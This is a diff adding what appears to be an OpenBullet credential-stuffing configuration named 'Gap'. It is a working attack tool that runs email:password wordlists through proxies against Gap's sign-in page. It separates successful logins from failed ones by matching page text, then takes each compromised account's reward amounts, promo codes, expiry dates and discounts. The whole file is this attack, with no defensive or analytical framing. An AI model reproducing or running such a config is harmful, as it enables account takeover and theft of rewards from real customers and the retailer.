@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "Gap",
+  "SuggestedBots": 1,
+  "LastModified": "2018-06-06T21:57:11.508552+00:00",
+  "AdditionalInfo": "",
+  "Author": "ReT and BUTTMUNCHER",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#get REQUEST GET "https://secure-www.gap.com/profile/validate_sign_in.do" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://secure-www.gap.com" 
+  HEADER "Referer: https://secure-www.gap.com/profile/validate_sign_in.do" 
+#login REQUEST POST "https://secure-www.gap.com/profile/validate_sign_in.do" AutoRedirect=TRUE 
+  CONTENT "emailAddress=<USER>&password=<PASS>&signInButton=Sign+In&userType=1&targetURL=%2Fprofile%2Faccount_summary.do&forwardName=&context=account_summary" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Sorry, we could not find the email/password" 
+  KEYCHAIN Success OR 
+    KEY "<h2 class=\"pageHeader heading-b_universal\">Reset Password</h2>" 
+REQUEST GET "https://secure-www.gap.com/resources/customer_value/v2" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://secure-www.gap.com/profile/customer_value.do" 
+PARSE "<SOURCE>" LR "\"amount\":" "," Recursive=TRUE -> CAP "Reward Amount" "" "" 
+PARSE "<SOURCE>" LR "\"expiryDate\":\"" "\"" Recursive=TRUE -> CAP "Exp" "" "" 
+PARSE "<SOURCE>" LR "promotionCode\":\"" "\"" Recursive=TRUE -> CAP "Promo Code" "" "" 
+PARSE "<SOURCE>" LR ",\"discountAmount\":" ",\"" Recursive=TRUE -> CAP "Discount Amount" "" "" 
